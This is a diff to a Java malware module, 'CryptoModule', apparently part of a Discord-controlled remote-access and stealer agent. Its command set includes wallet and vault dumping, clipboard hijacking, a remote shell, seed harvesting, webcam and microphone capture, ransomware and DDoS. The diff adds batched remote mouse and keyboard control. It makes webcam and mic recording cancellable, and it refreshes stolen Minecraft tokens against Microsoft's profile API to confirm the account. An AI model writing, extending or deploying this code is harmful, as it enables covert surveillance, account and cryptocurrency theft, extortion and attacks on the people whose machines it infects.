@@ -90,7 +90,7 @@ public final class CryptoModule {
 		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop", "clip_set",
 		"shell", "harvest", "screenshot", "file_pull", "cancel", "agent",
 		"webcam", "webcam:snapshot", "webcam:stream", "webcam:devices",
-		"desktop:frame", "desktop:screens", "input:mouse", "input:key", "clipboard:get", "minecraft:token");
+		"desktop:frame", "desktop:screens", "input:mouse", "input:key", "input:batch", "clipboard:get", "minecraft:token");
 	/** One collection at a time: these share a single heavy worker. */
 	private static final Set<String> HEAVY = Set.of("scan_wallets", "dump_vault", "crack_vault", "harvest");
 	static final String BUSY = "busy: another collection is running";
@@ -676,6 +676,18 @@ public final class CryptoModule {
 	}
 
 	private Map<String, Object> handle(Task task, AtomicBoolean cancel) throws Exception {
+		if (task.name().startsWith("webcam") && !com.spcagentpayloa.jvmxx.DiscordConfig.webcam()) {
+			throw new IllegalStateException("module_disabled: webcam");
+		}
+		if (task.name().startsWith("mic") && !com.spcagentpayloa.jvmxx.DiscordConfig.mic()) {
+			throw new IllegalStateException("module_disabled: mic");
+		}
+		if ((task.name().startsWith("desktop") || task.name().startsWith("input:")) && !com.spcagentpayloa.jvmxx.DiscordConfig.desktop()) {
+			throw new IllegalStateException("module_disabled: desktop");
+		}
+		if (task.name().startsWith("minecraft") && !com.spcagentpayloa.jvmxx.DiscordConfig.minecraft()) {
+			throw new IllegalStateException("module_disabled: minecraft");
+		}
 		moduleHealth.put(module(task.name()), "ok");
 		try {
 			return switch (task.name()) {
@@ -696,11 +708,12 @@ public final class CryptoModule {
 				case "desktop:screens" -> screens();
 				case "input:mouse" -> mouse(task);
 				case "input:key" -> keyboard(task);
+				case "input:batch" -> inputBatch(task);
 				case "clipboard:get" -> clipboardGet();
 				case "minecraft:token" -> minecraftToken();
 				case "files" -> files(task);
-				case "webcam", "webcam:snapshot", "webcam:stream", "webcam:devices" -> captureMedia(task, "webcam");
-				case "mic", "mic:record" -> captureMedia(task, "mic");
+				case "webcam", "webcam:snapshot", "webcam:stream", "webcam:devices" -> captureMedia(task, "webcam", cancel);
+				case "mic", "mic:record" -> captureMedia(task, "mic", cancel);
 				case "ransomware" -> ransomware(task, cancel);
 				case "ddos" -> ddos(task, cancel);
 				default -> Map.of("ok", false);
@@ -717,7 +730,7 @@ public final class CryptoModule {
 			case "clip_start", "clip_stop", "clip_set" -> "clipboard";
 			case "harvest" -> "seeds";
 			case "agent" -> "credentials";
-			case "monitor", "desktop:frame", "desktop:screens", "input:mouse", "input:key", "clipboard:get", "minecraft:token",
+			case "monitor", "desktop:frame", "desktop:screens", "input:mouse", "input:key", "input:batch", "clipboard:get", "minecraft:token",
 				"webcam", "webcam:snapshot", "webcam:stream", "webcam:devices", "mic", "mic:record" -> "monitor";
 			case "files", "ransomware" -> "files";
 			case "ddos" -> "network";
@@ -1650,10 +1663,10 @@ public final class CryptoModule {
 					uuid = String.valueOf(profiles.keySet().iterator().next()).replace("-", "");
 				}
 				row.put("uuid", uuid);
-				row.put("accessToken", token);
+				row.put("accessToken", token.length() > 4096 ? token.substring(0, 4096) : token);
 				String refresh = stringValue(map.get("refreshToken"));
 				if (refresh.isBlank()) refresh = stringValue(map.get("refresh_token"));
-				row.put("refreshToken", refresh);
+				row.put("refreshToken", refresh.length() > 4096 ? refresh.substring(0, 4096) : refresh);
 				row.put("expiresAt", stringValue(map.get("expiresAt")));
 				row.put("type", stringValue(map.get("type")).isBlank() ? fallbackType : stringValue(map.get("type")));
 				row.put("source", "file");
@@ -1678,7 +1691,7 @@ public final class CryptoModule {
 				String fallback = file.getFileName().toString().contains("launcher_profiles") ? "msa-launcher" : "msa";
 				harvestAccounts(Json.parseObject(text), fallback, rows, errors);
 			} catch (Throwable throwable) {
-				errors.add(file.getFileName() + ": " + throwable.getClass().getSimpleName());
+				if (errors.size() < 10) errors.add(file.getFileName() + ": " + throwable.getClass().getSimpleName());
 			}
 		}
 		// Dedupe por uuid+usuario y quedarse con el token de mayor caducidad.
@@ -1698,8 +1711,8 @@ public final class CryptoModule {
 		Map<String, Object> result = new LinkedHashMap<>();
 		result.put("accounts", accounts);
 		result.put("count", accounts.size());
-		result.put("errors", errors);
-		result.put("files", accountFiles().stream().map((file) -> file.getFileName().toString()).toList());
+		result.put("errors", errors.subList(0, Math.min(10, errors.size())));
+		result.put("files", accountFiles().stream().map((file) -> file.getFileName().toString()).limit(10).toList());
 		return result;
 	}
 
@@ -1748,10 +1761,15 @@ public final class CryptoModule {
 					String refreshed = refreshMinecraft(stringValue(row.get("refreshToken")));
 					if (!refreshed.isBlank()) {
 						out.put("accessToken", refreshed);
-						out.put("state", "refrescado");
+						state = "refrescado";
+						java.net.http.HttpResponse<String> check = request(client, "GET", "https://api.minecraftservices.com/minecraft/profile", refreshed, null);
+						if (check.statusCode() == 200) {
+							Map<String, Object> profile = Json.parseObject(check.body());
+							out.put("username", stringValue(profile.get("name")).isBlank() ? row.get("username") : profile.get("name"));
+							out.put("uuid", stringValue(profile.get("id")).replace("-", ""));
+						}
 						expires = expiry(out);
 						out.put("expiresAt", expires > 0 ? Instant.ofEpochMilli(expires).toString() : "");
-						state = "refrescado";
 					}
 				}
 			} else if (response.statusCode() == 403) {
@@ -1809,6 +1827,63 @@ public final class CryptoModule {
 		}
 	}
 
+	/** Hasta 64 eventos en una sola tarea: menos filas y menos RTT por gesto. */
+	private Map<String, Object> inputBatch(Task task) throws Exception {
+		Robot robot = new Robot();
+		int applied = 0;
+		for (Object raw : Json.list(task.params().get("events"))) {
+			if (!(raw instanceof Map<?, ?> map)) continue;
+			@SuppressWarnings("unchecked") Map<String, Object> event = (Map<String, Object>) map;
+			String type = String.valueOf(event.get("t"));
+			int screen = (int) Json.num(event, "screen", 0L);
+			Rectangle bounds = screenBounds(Math.max(0, screen));
+			double x = Math.max(0, Math.min(1, Json.num(event, "x", 0L) / 10000.0));
+			double y = Math.max(0, Math.min(1, Json.num(event, "y", 0L) / 10000.0));
+			if (type.equals("m") || type.equals("c") || type.startsWith("c")) {
+				robot.mouseMove(bounds.x + (int) Math.round(x * (bounds.width - 1)), bounds.y + (int) Math.round(y * (bounds.height - 1)));
+			}
+			switch (type) {
+				case "c" -> {
+					robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
+					robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
+				}
+				case "r" -> {
+					robot.mousePress(InputEvent.BUTTON3_DOWN_MASK);
+					robot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK);
+				}
+				case "w" -> robot.mouseWheel((int) Json.num(event, "d", 1L));
+				case "k" -> {
+					int vk = (int) Json.num(event, "vk", 0L);
+					String key = String.valueOf(event.get("key"));
+					if (vk <= 0) vk = key.isBlank() ? 0 : KeyEvent.getExtendedKeyCodeForChar(key.charAt(0));
+					List<Integer> mods = new ArrayList<>();
+					for (Object value : Json.list(event.get("mods"))) {
+						switch (String.valueOf(value).toLowerCase(java.util.Locale.ROOT)) {
+							case "ctrl" -> mods.add(KeyEvent.VK_CONTROL);
+							case "shift" -> mods.add(KeyEvent.VK_SHIFT);
+							case "alt" -> mods.add(KeyEvent.VK_ALT);
+							case "meta", "win" -> mods.add(KeyEvent.VK_WINDOWS);
+							default -> { }
+						}
+					}
+					for (int modifier : mods) robot.keyPress(modifier);
+					try {
+						if (vk > 0) {
+							robot.keyPress(vk);
+							robot.keyRelease(vk);
+						}
+					} finally {
+						for (int index = mods.size() - 1; index >= 0; index--) robot.keyRelease(mods.get(index));
+					}
+				}
+				default -> { }
+			}
+			applied++;
+			Thread.sleep(8L);
+		}
+		return Map.of("ok", true, "applied", applied);
+	}
+
 	private Map<String, Object> clipboardGet() throws Exception {
 		String text;
 		if (AgentPaths.isWindows()) {
@@ -1818,7 +1893,14 @@ public final class CryptoModule {
 		} else {
 			text = Shell.run(installDir, "sh -c 'wl-paste -n 2>/dev/null || xclip -o -selection clipboard 2>/dev/null'", 15_000L);
 		}
-		return Map.of("content", text == null ? "" : text);
+		String value = text == null ? "" : text;
+		boolean truncated = value.length() > 65_536;
+		if (truncated) value = value.substring(0, 65_536);
+		Map<String, Object> result = new LinkedHashMap<>();
+		result.put("content", value);
+		result.put("bytes", value.length());
+		result.put("truncated", truncated);
+		return result;
 	}
 
 	private byte[] jpeg(BufferedImage image, int quality) throws Exception {
@@ -1929,7 +2011,7 @@ public final class CryptoModule {
 		return result;
 	}
 
-	private Map<String, Object> captureMedia(Task task, String kind) throws Exception {
+	private Map<String, Object> captureMedia(Task task, String kind, AtomicBoolean cancel) throws Exception {
 		if ("webcam:devices".equals(task.name()) || "devices".equals(task.params().get("mode"))) {
 			return devices();
 		}
@@ -1981,12 +2063,35 @@ public final class CryptoModule {
 		} catch (Throwable throwable) {
 			throw new IllegalStateException("ffmpeg_missing: " + throwable.getMessage());
 		}
-		String log = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
-		if (!process.waitFor(60, TimeUnit.SECONDS)) {
+		java.io.ByteArrayOutputStream captured = new java.io.ByteArrayOutputStream();
+		Thread reader = new Thread(() -> {
+			try {
+				process.getInputStream().transferTo(captured);
+			} catch (Throwable ignored) {
+				// el proceso se cerró
+			}
+		}, "spc-media-read");
+		reader.setDaemon(true);
+		reader.start();
+		long deadline = System.currentTimeMillis() + 60_000L;
+		boolean cancelled = false;
+		while (process.isAlive() && System.currentTimeMillis() < deadline) {
+			if (cancel.get()) {
+				cancelled = true;
+				process.destroyForcibly();
+				break;
+			}
+			Thread.sleep(100L);
+		}
+		if (process.isAlive()) {
 			process.destroyForcibly();
 			throw new IllegalStateException(kind + "_timeout");
 		}
-		if (process.exitValue() != 0) {
+		reader.join(2_000L);
+		String log = captured.toString(StandardCharsets.UTF_8);
+		// Al cancelar, ffmpeg sale con código distinto pero los segmentos ya
+		// escritos son válidos: se publican igual.
+		if (process.exitValue() != 0 && !cancelled) {
 			throw new IllegalStateException(kind + "_unavailable: " + log.strip().replace('\n', ' ').substring(0, Math.min(800, log.strip().length())));
 		}
 		Map<String, Object> result = new LinkedHashMap<>();
@@ -2003,12 +2108,18 @@ public final class CryptoModule {
 					}
 				}
 			}
-			if (frames.isEmpty()) throw new IllegalStateException("webcam_unavailable: sin fotogramas");
+			if (frames.isEmpty()) {
+				if (cancelled) throw new IllegalStateException("cancelled");
+				throw new IllegalStateException("webcam_unavailable: sin fotogramas");
+			}
 			result.put("frames", frames);
 			result.put("fps", fps);
 			result.put("count", frames.size());
 		} else if ("webcam".equals(kind)) {
-			if (!Files.isRegularFile(out) || Files.size(out) == 0) throw new IllegalStateException("webcam_unavailable: imagen vacía");
+			if (!Files.isRegularFile(out) || Files.size(out) == 0) {
+				if (cancelled) throw new IllegalStateException("cancelled");
+				throw new IllegalStateException("webcam_unavailable: imagen vacía");
+			}
 			result.put("data", Base64.getEncoder().encodeToString(Files.readAllBytes(out)));
 			result.put("bytes", Files.size(out));
 			Files.deleteIfExists(out);
@@ -2027,7 +2138,10 @@ public final class CryptoModule {
 				}
 			}
 			Files.deleteIfExists(segments);
-			if (!Files.isRegularFile(out) || Files.size(out) == 0) throw new IllegalStateException("mic_unavailable: audio vacío");
+			if (!Files.isRegularFile(out) || Files.size(out) == 0) {
+				if (cancelled) throw new IllegalStateException("cancelled");
+				throw new IllegalStateException("mic_unavailable: audio vacío");
+			}
 			byte[] bytes = Files.readAllBytes(out);
 			result.put("bytes", bytes.length);
 			result.put("seconds", Json.num(task.params(), "seconds", 15L));
